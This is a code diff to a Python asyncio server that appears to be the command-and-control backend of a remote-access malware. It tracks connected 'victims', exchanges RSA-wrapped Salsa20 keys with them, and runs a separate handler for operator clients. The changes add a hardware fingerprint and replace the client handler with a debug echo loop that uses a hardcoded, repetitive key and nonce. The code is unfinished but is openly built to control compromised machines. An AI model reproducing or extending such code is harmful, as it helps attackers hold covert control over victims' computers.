@@ -1,10 +1,15 @@
 import asyncio
 import rsa
 import zlib
+import uuid
+import hashlib
 
-from lib.crypto import EncryptedTunnel
+from Crypto.Random import get_random_bytes
 
-BUFFER = 1024
+from lib.crypto import EncryptedTunnel, get_hwid
+
+BUFSIZE = 1024
+FINGERPRINT = hashlib.sha256((hex(uuid.getnode()) + get_hwid()).encode()).hexdigest()
 VICTIMS: dict = {}
 CLIENTS: dict = {}
 
@@ -14,7 +19,7 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
     formated_peername = peername[0] + ':' + str(peername[1])
     
     # Get a fingerprint (random string)
-    fingerprint = await r.read(BUFFER)
+    fingerprint = await r.read(BUFSIZE)
 
     # Generate rsa keys
     # will be used for key exchange + nonce to start communicating only with Salsa20
@@ -26,7 +31,7 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
 
     # Gets the RSA-encrypted string containing the key and nonce
     # splits the string using '<SPR>' as the separator
-    key, nonce = zlib.decompress(rsa.decrypt(await r.read(BUFFER), private_key)).split(b"<SPR>")
+    key, nonce = zlib.decompress(rsa.decrypt(await r.read(BUFSIZE), private_key)).split(b"<SPR>")
 
     # Initializes the 'EncryptedTunnel' class that allows communication with the client using Salsa20,
     # using the key and nonce obtained previously
@@ -38,12 +43,21 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
 # TODO: client management
 
 async def handle_clients(r: asyncio.streams.StreamReader, w: asyncio.streams.StreamWriter):
-    username = await r.read(BUFFER)
+    try:
+        key = b'c'*32
+        nonce = b'c'*8
 
-    w.write(''.join(VICTIMS.keys()).encode());
-    await w.drain()
+        while True:
+            si = await r.read(BUFSIZE)
+            print(si)
+            w.write(si)
+            await w.drain()
+    
+    except Exception as e:
+        print(e)
+    
 
-    CLIENTS[username] = (w, r)
+    # CLIENTS[username] = (w, r)
 
 async def run_forever(server):
     async with server:
